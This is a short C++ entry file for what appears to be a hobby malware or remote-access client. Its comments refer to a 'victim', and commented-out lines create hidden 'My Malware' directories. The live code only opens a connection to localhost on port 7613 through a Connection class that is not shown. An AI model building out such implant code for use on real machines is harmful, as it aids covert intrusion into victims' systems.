#include <iostream>
#include "Connection.h"
#include <windows.h>


int main() {


    //Creating the files on victim
//    CreateDirectory("C:\\Users\\All Users\\My Malware", NULL);
//    SetFileAttributes("C:\\Users\\All Users\\My Malware", FILE_ATTRIBUTE_HIDDEN);
//    CreateDirectory("C:\\Users\\All Users\\My Malware\\files", NULL);
//    SetFileAttributes("C:\\Users\\All Users\\My Malware\\files", FILE_ATTRIBUTE_HIDDEN);

    string ip = "127.0.0.1";
    int port = 7613;


    Connection *connection = new Connection(ip, port);
    connection->connection();


    return 0;
}
